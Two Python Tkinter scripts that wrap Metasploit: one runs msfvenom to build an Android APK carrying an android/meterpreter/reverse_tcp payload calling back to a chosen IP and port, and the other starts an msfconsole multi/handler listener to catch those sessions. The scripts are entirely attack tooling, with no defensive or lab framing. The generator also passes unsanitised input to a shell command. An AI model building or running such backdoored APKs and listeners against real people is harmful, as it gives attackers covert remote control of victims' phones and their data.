#apkcreate.py
import tkinter as tk
from tkinter import messagebox
import subprocess

class APKGeneratorApp:
    def __init__(self, root):
        self.root = root
        self.root.title("APK Generator")

        # IP Address Entry for APK Generation
        self.ip_label = tk.Label(root, text="LHOST (Your IP) for APK:")
        self.ip_label.pack(pady=5)
        self.ip_entry = tk.Entry(root, width=20)
        self.ip_entry.pack(pady=5)

        # Port Entry for APK Generation
        self.port_label = tk.Label(root, text="LPORT for APK:")
        self.port_label.pack(pady=5)
        self.port_entry = tk.Entry(root, width=20)
        self.port_entry.pack(pady=5)

        # Generate APK Button
        self.generate_button = tk.Button(root, text="Generate APK", command=self.generate_apk)
        self.generate_button.pack(pady=20)

    def generate_apk(self):
        # Retrieve input values for APK generation
        lhost = self.ip_entry.get()
        lport = self.port_entry.get()

        if not lhost or not lport:
            messagebox.showerror("Input Error", "Please provide both IP address and port.")
            return

        # Define output file name
        output_file = "test.apk"

        # Full path to msfvenom (update this if necessary)
        msfvenom_path = "/usr/bin/msfvenom"

        # Construct the msfvenom command
        command = f"{msfvenom_path} -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o {output_file}"

        try:
            # Run the msfvenom command
            result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            if result.returncode == 0:
                messagebox.showinfo("Success", f"APK file generated successfully: {output_file}")
            else:
                messagebox.showerror("Error", f"Failed to generate APK: {result.stderr.decode()}")
        except FileNotFoundError:
            messagebox.showerror("Error", "msfvenom not found. Please ensure it is installed and the path is correct.")
        except subprocess.CalledProcessError as e:
            messagebox.showerror("Error", f"Error running msfvenom: {e.stderr.decode()}")

if __name__ == "__main__":
    root = tk.Tk()
    app = APKGeneratorApp(root)
    root.mainloop()
  
#Listener
import tkinter as tk
from tkinter import messagebox
import subprocess
import shlex
import os

class MetasploitListenerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Metasploit Listener")

        # IP Address Entry for Listener
        self.listener_ip_label = tk.Label(root, text="LHOST (Your IP) for Listener:")
        self.listener_ip_label.pack(pady=5)
        self.listener_ip_entry = tk.Entry(root, width=20)
        self.listener_ip_entry.pack(pady=5)

        # Port Entry for Listener
        self.listener_port_label = tk.Label(root, text="LPORT for Listener:")
        self.listener_port_label.pack(pady=5)
        self.listener_port_entry = tk.Entry(root, width=20)
        self.listener_port_entry.pack(pady=5)

        # Start Listener Button
        self.start_listener_button = tk.Button(root, text="Start Listener", command=self.start_listener)
        self.start_listener_button.pack(pady=20)

    def start_listener(self):
        # Retrieve input values for listener
        lhost = self.listener_ip_entry.get()
        lport = self.listener_port_entry.get()

        if not lhost or not lport:
            messagebox.showerror("Input Error", "Please provide both IP address and port.")
            return

        # Define the msfconsole command
        command = f"msfconsole -x 'use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; exploit'"

        # Open a new terminal and run the command
        if os.name == 'nt':  # For Windows
            subprocess.Popen(['start', 'cmd', '/k', command], shell=True)
        else:  # For Unix-based systems
            subprocess.Popen(['xterm', '-e', command], shell=False)

        messagebox.showinfo("Success", "Listener started successfully. A new terminal window should open.")

if __name__ == "__main__":
    root = tk.Tk()
    app = MetasploitListenerApp(root)
    root.mainloop()

